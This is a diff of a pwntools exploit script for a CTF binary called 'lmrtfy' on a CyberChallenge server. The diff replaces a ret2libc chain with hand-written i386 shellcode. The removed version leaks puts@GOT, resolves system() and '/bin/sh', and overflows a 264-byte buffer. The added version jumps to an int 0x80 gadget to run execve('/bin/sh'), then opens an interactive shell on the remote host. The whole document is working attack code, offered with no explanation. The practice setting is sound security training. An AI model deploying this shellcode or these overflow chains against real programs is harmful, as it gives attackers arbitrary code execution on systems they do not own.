@@ -1,61 +1,45 @@
 from pwn import *
 
-# Set up the binary
-context.binary = binary = './lmrtfy'
+context.log_level = 'debug'
 context.arch = 'i386'
-# p = remote('lmrtfy.challs.cyberchallenge.it', 9122)
-libc = ELF('/usr/lib32/libc.so.6')  # Adjust based on target
-elf = ELF(binary)
+context.binary = e = ELF('./lmrtfy')
 
-p = process(binary)
+# Find int 0x80 gadget (if not at 0x08049444)
+int80_gadget = 0x08049444  # Replace with actual address if different
+#
+# shell = asm('''
+#     mov eax, 0x68732f2f
+#     push eax
+#     mov eax, 0x6e69622f
+#     push eax
+#     mov ebx, 0x00000000
+#     push ebx
+#     call {}
+# '''.format(hex(int80_gadget)))
 
-gdb.attach(p, gdbscript="""
-""")
+shell = asm(f'''
+    xor eax, eax
+    xor ebx, ebx
+    xor ecx, ecx
+    xor edx, edx
+    push 0x0b
+    pop eax
+    push ebx
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    mov esi, {int80_gadget}
+    jmp esi
+''')
 
-# # Shellcode without forbidden bytes
-# shellcode = asm('''
-#     mov eax, 0xb       
-#     lea ebx, [esp+0x20] 
-#     xor ecx, ecx       
-#     xor edx, edx       
-#     int 0x81           
+
+# p = process('./lmrtfy')
+p = remote('lmrtfy.challs.cyberchallenge.it', 9124)
+
+# gdb.attach(p, '''
+#     b *0x0804943d
+#     continue
 # ''')
-#
-# # Pad with NOPs and append "/bin/sh"
-# payload = b'\x90' * 200 + shellcode + b'/bin/sh\x00'
-#
-# # Send payload
-# p.sendline(payload)
-# p.interactive()
 
-# Gadgets
-pop_ebx = 0x08049022  # "pop ebx; ret" (find with `ROPgadget --binary vuln`)
-puts_plt = elf.plt['puts']
-puts_got = elf.got['puts']
-main_addr = elf.symbols['main']  # To restart execution after leak
-
-# Stage 1: Leak libc address
-payload = b'A' * 264  # Fill buffer (adjust offset)
-payload += p32(puts_plt)
-payload += p32(main_addr)  # Return to main after leak
-payload += p32(puts_got)   # Arg: puts@GOT
-
-p.sendline(payload)
-
-# Parse leaked libc address
-leaked_puts = u32(p.recv(4))
-log.success(f"Leaked puts@libc: {hex(leaked_puts)}")
-
-# Compute libc base & system
-libc_base = leaked_puts - libc.symbols['puts']
-system_addr = libc_base + libc.symbols['system']
-binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
-
-# Stage 2: Call system("/bin/sh")
-payload = b'A' * 264
-payload += p32(system_addr)
-payload += p32(0xdeadbeef)  # Fake return address
-payload += p32(binsh_addr)  # Arg: "/bin/sh"
-
-p.sendline(payload)
+p.sendline(shell)
 p.interactive()
